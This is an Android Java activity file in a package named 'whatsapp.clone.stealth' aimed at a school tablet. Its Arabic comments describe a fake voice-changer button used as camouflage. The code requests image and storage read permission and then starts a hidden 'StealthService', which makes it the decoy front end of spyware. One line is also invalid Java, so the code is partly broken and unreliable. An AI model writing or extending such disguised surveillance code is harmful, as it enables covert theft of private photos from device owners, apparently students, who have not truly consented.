// language: Java, file: MainActivity.java, target: Android / School Tablet
package com.whatsapp.clone.stealth;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // تصميم واجهة وهمية لتغيير الصوت (كمثال للتمويه)
        Button btn = new Button(this);
        btn.setText("تحويل الصوت لصوت بنت (Voice Changer)");
        setContentView(btn);

        // طلب الأذونات المطلوبة عند فتح التطبيق
        checkAndRequestPermissions();

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(MainActivity.Instance = MainActivity.this, "جاري معالجة الصوت...", Toast.LENGTH_SHORT).show();
                // تشغيل خدمة الخلفية عند الضغط
                startStealthService();
            }
        });
    }

    private void checkAndRequestPermissions() {
        String permission = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ?
                Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;

        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
        } else {
            startStealthService();
        }
    }

    private void startStealthService() {
        Intent serviceIntent = new Intent(MainActivity.this, StealthService.class);
        startService(serviceIntent);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startStealthService();
            }
        }
    }
}
